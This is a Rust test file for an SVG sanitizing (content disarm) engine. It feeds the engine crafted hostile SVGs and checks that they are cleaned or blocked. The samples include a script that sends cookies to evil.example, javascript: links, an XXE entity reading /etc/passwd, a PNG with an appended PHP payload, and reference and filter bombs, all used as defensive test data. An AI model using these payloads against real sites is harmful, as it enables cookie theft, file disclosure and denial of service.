mod common;

use base64::Engine as _;
use cdr::{CdrResult, Engine, Status};
use common::{make_zip, png_with_payload, unzip};

fn cats(r: &CdrResult) -> Vec<(String, String)> {
    r.findings
        .iter()
        .map(|f| (f.category.clone(), format!("{:?}", f.severity)))
        .collect()
}

fn malicious_svg() -> String {
    let png = base64::engine::general_purpose::STANDARD.encode(png_with_payload());
    format!(
        r##"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
     width="100" height="100" viewBox="0 0 100 100" onload="alert(1)" sodipodi:docname="x.svg">
  <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
  <style>@import url(https://evil.example/a.css); rect {{ fill: red }}</style>
  <style>@media print {{ .k {{ fill: url(#g) }} }}</style>
  <defs>
    <linearGradient id="g" xlink:href="#base"><stop offset="0" stop-color="#fff"/></linearGradient>
    <linearGradient id="h" href="https://evil.example/grad.svg#x"/>
  </defs>
  <rect id="box" x="10" y="10" width="80" height="80" fill="url(#g)" style="stroke:blue;stroke-width:2" onclick="evil()"/>
  <circle cx="50" cy="50" r="10" fill="url(https://evil.example/track)"/>
  <rect width="5" height="5" style="background:url(//evil.example/p)"/>
  <a href="javascript:alert(2)"><text x="10" y="95">링크 글자</text></a>
  <use href="https://evil.example/sprite.svg#icon"/>
  <use xlink:href="#box"/>
  <image href="https://evil.example/pixel.png" width="1" height="1"/>
  <image xlink:href="data:image/png;base64,{png}" width="8" height="8"/>
  <foreignObject width="10" height="10"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example"/></foreignObject>
  <set attributeName="href" to="javascript:alert(3)"/>
  <animate attributeName="fill" to="red" dur="1s"/>
  <sodipodi:namedview pagecolor="#fff"/>
</svg>"##
    )
}

#[test]
fn svg_is_rebuilt_from_allowed_elements() {
    let r = Engine::default().process(malicious_svg().as_bytes(), "그림.svg");
    assert_eq!(
        r.status,
        Status::Sanitized,
        "{} {:#?}",
        r.reason,
        r.findings
    );
    assert_eq!(r.output_filename.as_deref(), Some("그림.svg"));
    let out = String::from_utf8(r.output.clone().unwrap()).unwrap();
    for bad in [
        "script",
        "onload",
        "onclick",
        "javascript",
        "evil.example",
        "@import",
        "foreignObject",
        "iframe",
        "<set",
        "<animate",
        "sodipodi",
        "DOCTYPE",
        "<a ",
    ] {
        assert!(!out.contains(bad), "{bad} 가 남아 있음:\n{out}");
    }
    // 허용된 그리기·문서 안 참조·안전한 CSS 는 유지
    for good in [
        r##"fill="url(#g)""##,
        r##"xlink:href="#base""##,
        r##"xlink:href="#box""##,
        "stroke:blue;stroke-width:2",
        "@media print",
        "링크 글자",
        "<circle",
    ] {
        assert!(out.contains(good), "{good} 가 없음:\n{out}");
    }
    // 내장 PNG 는 재인코딩되어 덧붙은 데이터가 사라진다
    let at = out.find("data:image/png;base64,").expect("내장 그림 유지") + 22;
    let b64: String = out[at..].chars().take_while(|&c| c != '"').collect();
    let png = base64::engine::general_purpose::STANDARD
        .decode(b64)
        .unwrap();
    assert!(!png.windows(5).any(|w| w == b"<?php"));
    image::load_from_memory(&png).expect("재인코딩된 PNG");

    let c = cats(&r);
    assert!(c.contains(&("script".into(), "High".into())), "{c:?}");
    assert!(
        c.contains(&("external-resource".into(), "Medium".into())),
        "{c:?}"
    );

    let again = Engine::default().process(out.as_bytes(), "그림.svg");
    assert_eq!(again.status, Status::Clean, "{:#?}", again.findings);
    assert_eq!(again.output.as_deref(), Some(out.as_bytes()), "고정점");
}

#[test]
fn svg_entities_and_non_svg_are_blocked() {
    let xxe = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>"#;
    let r = Engine::default().process(xxe.as_bytes(), "a.svg");
    assert_eq!(r.status, Status::Blocked);
    // SVG 는 확장자가 .svg 일 때만 받는다 (HTML 등으로 오인하지 않도록)
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>"#;
    assert_eq!(
        Engine::default().process(svg.as_bytes(), "a.html").status,
        Status::Blocked
    );
    // 루트가 svg 가 아니면 차단
    let html = r#"<html><body><svg/></body></html>"#;
    assert_eq!(
        Engine::default().process(html.as_bytes(), "a.svg").status,
        Status::Blocked
    );
}

#[test]
fn docx_svg_blip_is_rebuilt() {
    const CT: &str = "http://schemas.openxmlformats.org/package/2006/content-types";
    const PR: &str = "http://schemas.openxmlformats.org/package/2006/relationships";
    const REL: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    let ct = format!(
        r#"<Types xmlns="{CT}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/><Default Extension="svg" ContentType="image/svg+xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#
    );
    let rels = format!(
        r#"<Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/></Relationships>"#
    );
    let doc_rels = format!(
        r#"<Relationships xmlns="{PR}"><Relationship Id="rId5" Type="{REL}/image" Target="media/image1.png"/><Relationship Id="rId6" Type="{REL}/image" Target="media/image2.svg"/></Relationships>"#
    );
    // Office 2016+ 형식: PNG 대체 그림 + 확장 목록의 SVG
    let doc = format!(
        r#"<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="{REL}" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main"><w:body><w:p><w:r><w:drawing><a:blip r:embed="rId5"><a:extLst><a:ext uri="{{96DAC541-7B7A-43D3-8B79-37D633B846F1}}"><asvg:svgBlip r:embed="rId6"/></a:ext></a:extLst></a:blip></w:drawing></w:r></w:p></w:body></w:document>"#
    );
    let png = png_with_payload();
    let svg = malicious_svg();
    let src = make_zip(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("_rels/.rels", rels.as_bytes()),
        ("word/document.xml", doc.as_bytes()),
        ("word/_rels/document.xml.rels", doc_rels.as_bytes()),
        ("word/media/image1.png", &png),
        ("word/media/image2.svg", svg.as_bytes()),
    ]);
    let r = Engine::default().process(&src, "a.docx");
    assert_eq!(
        r.status,
        Status::Sanitized,
        "{} {:#?}",
        r.reason,
        r.findings
    );
    let files = unzip(r.output.as_ref().unwrap());
    let part = |n: &str| {
        files
            .iter()
            .find(|(f, _)| f == n)
            .map(|(_, d)| String::from_utf8_lossy(d).to_string())
            .unwrap_or_else(|| panic!("{n} 없음"))
    };
    let out_svg = part("word/media/image2.svg");
    assert!(out_svg.contains("<rect") && !out_svg.contains("script") && !out_svg.contains("evil"));
    assert!(part("[Content_Types].xml").contains("image/svg+xml"));
    let d = part("word/document.xml");
    assert!(
        d.contains("svgBlip") && d.contains("rId6"),
        "SVG 참조 유지: {d}"
    );

    let again = Engine::default().process(r.output.as_ref().unwrap(), "a.docx");
    assert_eq!(again.status, Status::Clean, "{:#?}", again.findings);
}

#[test]
fn svg_reference_bombs_are_blocked() {
    let blocked = |svg: &str| {
        let r = Engine::default().process(svg.as_bytes(), "a.svg");
        assert_eq!(r.status, Status::Blocked, "{:#?}", r.findings);
        assert!(
            r.findings.iter().any(|f| f.category == "resource"),
            "{:#?}",
            r.findings
        );
    };
    // use 폭탄: 10단계 × 10배 = 100억 개 요소
    let mut s = String::from(
        r#"<svg xmlns="http://www.w3.org/2000/svg"><defs><rect id="a0" width="1" height="1"/>"#,
    );
    for i in 1..=10 {
        s += &format!(r#"<g id="a{i}">"#);
        for _ in 0..10 {
            s += &format!(r##"<use href="#a{}"/>"##, i - 1);
        }
        s += "</g>";
    }
    s += r##"</defs><use href="#a10"/></svg>"##;
    blocked(&s);
    // 무늬 폭탄: <style> 규칙과 fill=url(#p) 로 무늬 안에 무늬를 겹침
    let mut s = String::from(
        r#"<svg xmlns="http://www.w3.org/2000/svg"><style>.k{fill:url(#p0)}</style><defs><pattern id="p10"><rect width="1" height="1"/></pattern>"#,
    );
    for i in (0..10).rev() {
        s += &format!(r#"<pattern id="p{i}">"#);
        for _ in 0..10 {
            s += &format!(r##"<rect width="1" height="1" fill="url(#p{})"/>"##, i + 1);
        }
        s += "</pattern>";
    }
    s += r#"</defs><rect class="k" width="9" height="9"/></svg>"#;
    blocked(&s);
    // 너무 깊은 참조 사슬 (앞쪽 요소가 뒤쪽을 가리켜 재귀가 깊어짐)
    let mut s = String::from(r#"<svg xmlns="http://www.w3.org/2000/svg"><defs>"#);
    for i in 0..40 {
        s += &format!(r##"<use id="c{i}" href="#c{}"/>"##, i + 1);
    }
    s += r##"<rect id="c40" width="1" height="1"/></defs><use href="#c0"/></svg>"##;
    blocked(&s);
    // 뒤쪽이 앞쪽을 가리키는 긴 사슬은 펼쳐도 선형이라 통과
    let mut s = String::from(
        r#"<svg xmlns="http://www.w3.org/2000/svg"><defs><rect id="d0" width="1" height="1"/>"#,
    );
    for i in 1..=40 {
        s += &format!(r##"<use id="d{i}" href="#d{}"/>"##, i - 1);
    }
    s += r##"</defs><use href="#d40"/></svg>"##;
    let r = Engine::default().process(s.as_bytes(), "a.svg");
    assert_ne!(r.status, Status::Blocked, "{:#?}", r.findings);
    // 순환 참조와 평범한 재사용은 그대로 통과
    let ok = r##"<svg xmlns="http://www.w3.org/2000/svg"><defs><g id="x"><use href="#y"/></g><g id="y"><use href="#x"/><rect width="1" height="1"/></g></defs><use href="#y"/><use href="#y"/></svg>"##;
    let r = Engine::default().process(ok.as_bytes(), "a.svg");
    assert_ne!(r.status, Status::Blocked, "{:#?}", r.findings);
}

#[test]
fn svg_rendering_cost_is_limited() {
    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" width="3000000" height="1500000" viewBox="0 0 1000 500">
  <style>.d{stroke-dasharray: 0.001 0.001 ; stroke:red} .e{stroke-dasharray:4 2}</style>
  <defs>
    <filter id="f" x="-50000%" y="-10" width="100000%" height="999"><feGaussianBlur stdDeviation="1e9 5"/><feMorphology radius="100000000"/></filter>
    <filter id="u" filterUnits="userSpaceOnUse" x="0" y="0" width="1e12mm" height="100"><feDropShadow stdDeviation="3"/></filter>
  </defs>
  <rect width="10" height="10" filter="url(#f)"/>
  <path d="M0 0L1000000 0" stroke="#000" stroke-dasharray="0.01,0.02"/>
  <path class="d" d="M0 0L9 9" style="stroke-dasharray:0.01;fill:none"/>
  <path class="e" d="M0 0L9 9" stroke-dasharray="5 5" filter="url(#u)"/>
</svg>"##;
    let r = Engine::default().process(svg.as_bytes(), "a.svg");
    assert_eq!(
        r.status,
        Status::Sanitized,
        "{} {:#?}",
        r.reason,
        r.findings
    );
    assert!(
        r.findings
            .iter()
            .any(|f| f.category == "resource" && f.description.contains("렌더링")),
        "{:#?}",
        r.findings
    );
    let out = String::from_utf8(r.output.clone().unwrap()).unwrap();
    for want in [
        // 캔버스는 긴 변 20000px 로 (viewBox 는 그대로)
        r#"width="20000" height="10000" viewBox="0 0 1000 500""#,
        // 필터 영역은 대상 상자 앞뒤로 10배까지 (대상은 계속 덮음)
        r#"<filter id="f" x="-10" y="-10" width="21" height="21">"#,
        // 흐림·모폴로지 반경은 뷰포트 긴 변까지
        r#"stdDeviation="1000 5""#,
        r#"radius="1000""#,
        // 사용자 좌표 필터 영역은 뷰포트의 10배
        r#"x="0" y="0" width="10000" height="100""#,
        // 지나치게 촘촘한 점선은 실선으로
        r#"stroke-dasharray="none""#,
        ".d{stroke-dasharray:none; stroke:red}",
        "stroke-dasharray:none;fill:none",
        // 평범한 값은 그대로
        "stroke-dasharray:4 2",
        r#"stroke-dasharray="5 5""#,
        r#"stdDeviation="3""#,
    ] {
        assert!(out.contains(want), "{want} 가 없음:\n{out}");
    }
    let again = Engine::default().process(out.as_bytes(), "a.svg");
    assert_eq!(again.status, Status::Clean, "{:#?}", again.findings);
    assert_eq!(again.output.as_deref(), Some(out.as_bytes()), "고정점");

    // 필터 폭탄: 필터를 건 요소를 use 로 펼쳐 필터 계산을 수만 번 반복
    let mut s = String::from(
        r#"<svg xmlns="http://www.w3.org/2000/svg"><defs><filter id="b"><feGaussianBlur stdDeviation="2"/><feOffset dx="1"/><feMerge><feMergeNode/></feMerge></filter><rect id="a0" width="1" height="1" filter="url(#b)"/>"#,
    );
    for i in 1..=4 {
        s += &format!(r#"<g id="a{i}">"#);
        for _ in 0..10 {
            s += &format!(r##"<use href="#a{}"/>"##, i - 1);
        }
        s += "</g>";
    }
    s += r##"</defs><use href="#a4"/></svg>"##;
    let r = Engine::default().process(s.as_bytes(), "a.svg");
    assert_eq!(r.status, Status::Blocked, "{:#?}", r.findings);
    assert!(r.reason.contains("필터"), "{}", r.reason);

    // viewBox 가 없는 큰 캔버스는 원래 좌표계를 viewBox 로 적고 줄인다
    let big = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100000" height="50cm"><rect width="9" height="9"/></svg>"#;
    let r = Engine::default().process(big.as_bytes(), "a.svg");
    let out = String::from_utf8(r.output.clone().unwrap()).unwrap();
    assert!(
        out.contains(r#"width="20000" height="377.952755" viewBox="0 0 100000 1889.763779""#),
        "{out}"
    );
    let again = Engine::default().process(out.as_bytes(), "a.svg");
    assert_eq!(again.status, Status::Clean, "{:#?}", again.findings);
}
